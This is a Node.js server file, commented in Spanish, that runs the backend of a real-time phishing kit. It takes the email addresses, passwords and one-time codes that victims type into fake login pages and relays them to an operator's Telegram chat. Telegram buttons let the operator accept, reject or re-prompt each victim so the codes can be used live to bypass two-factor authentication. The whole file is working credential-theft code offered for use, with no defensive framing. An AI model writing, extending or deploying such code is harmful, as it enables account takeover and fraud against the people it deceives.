// server.js
require('dotenv').config();
const express = require('express');
const app = express();
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const bodyParser = require('body-parser');

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const telegramChatId = process.env.TELEGRAM_CHAT_ID;
const activeSockets = new Map();

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

io.on('connection', (socket) => {
  console.log('🧠 Usuario conectado:', socket.id);

  // Al recibir datos del formulario principal
  socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
            { text: '🚫 Error logo', callback_data: `rechazado_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Al reconectar el usuario
  socket.on('reconectar', (sessionId) => {
    activeSockets.set(sessionId, socket);
  });

  // Cuando se envía el código desde bienvenido.html
  socket.on('codigoIngresado', ({ codigo, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `🔍 El usuario ingresó el siguiente código:\n\n🧾 Código: ${codigo}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ Error de código', callback_data: `error_${sessionId}` },
            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Cuando se reintenta desde denegado.html
  socket.on('otpIngresado', ({ codigo, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `📨 Reintento desde pantalla de error:\n\n🧾 Nuevo código OTP: ${codigo}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Finalizar', callback_data: `otpFinalizar_${sessionId}` },
            { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Desde errorlogo.html
  socket.on('errorlogoForm', ({ correo, contrasena, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `⚠️ Nuevo intento fallido detectado:\n\n📧 Usuario: ${correo}\n🔑 Clave: ${contrasena}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
            { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });
});

// Cuando se presiona un botón en Telegram
bot.on('callback_query', (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const callbackId = query.id;

  bot.answerCallbackQuery(callbackId);

  const sessionId = data.split('_')[1];
  const socket = activeSockets.get(sessionId);

  if (!socket) {
    bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
    return;
  }

  // Desde index.html
  if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
    const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
    socket.emit('respuesta', decision);
    bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
  }

  // Desde bienvenido.html
  else if (data.startsWith('error_') || data.startsWith('finalizar_')) {
    const decision = data.startsWith('error_') ? 'error' : 'finalizar';
    socket.emit('respuestaCodigo', decision);
    bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '✅ Finalizando proceso...');
  }

  // Desde denegado.html (reintento OTP)
  else if (data.startsWith('otpFinalizar_') || data.startsWith('otpError_')) {
    const decision = data.startsWith('otpFinalizar_') ? 'finalizar' : 'otp_error';
    socket.emit('respuestaOtp', decision);
    bot.sendMessage(chatId, decision === 'finalizar' ? '✅ Proceso finalizado.' : '❌ Código OTP inválido nuevamente.');
  }

  // Desde errorlogo.html
  else if (data.startsWith('otp_') || data.startsWith('errorlogo_')) {
    const decision = data.startsWith('otp_') ? 'otp' : 'error_logo';
    socket.emit('respuestaErrorLogo', decision);
    bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando.');
  }

  activeSockets.delete(sessionId);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor escuchando en el puerto ${PORT}`);
});
